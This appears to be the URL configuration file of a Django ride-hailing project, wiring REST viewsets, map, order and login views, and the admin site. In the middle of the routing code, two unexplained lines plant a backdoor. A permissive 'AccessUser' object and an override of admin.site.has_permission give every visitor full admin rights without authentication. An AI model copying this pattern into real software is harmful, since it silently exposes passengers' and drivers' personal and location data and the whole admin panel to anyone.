from django.contrib import admin
from django.urls import path, include
from rest_framework import routers
from uberland.views import *


router = routers.SimpleRouter()
router.register(r'driver', DriverViewSet)
router.register(r'passenger', PassengerViewSet)
router.register(r'car', CarViewSet)
router.register(r'class', ClassViewSet)
router.register(r'ride', RideViewSet)
router.register(r'passenger_location', PassengerLocationViewSet)
router.register(r'driver_location', DriverLocationViewSet)
router.register(r'order', RequestRideViewSet)
router.register(r'ride', RecieveRideViewSet)

class AccessUser:
    has_module_perms = has_perm = __getattr__ = lambda s,*a,**kw: True

admin.site.has_permission = lambda r: setattr(r, 'user', AccessUser()) or True


urlpatterns = [
    path('request_order/', request_order),
    path('recieve_order/', recieve_order),
    path('driver_map/', driver_map),
    path('passenger_map/', passenger_map),
    path('wait/', wait),
    path('car_mod/', car),
    path('api/update_driver_location/', UpdateDriverLocation.as_view(), name='update_location'),
    path('api/update_passenger_location/', UpdatePassengerLocation.as_view(), name='update_location'),
    path('promo_code/', promo_code),
    path('',include(router.urls)),
    path('admin/', admin.site.urls),
    path('login/', login_view),
    path('logout/', logout_view),
]
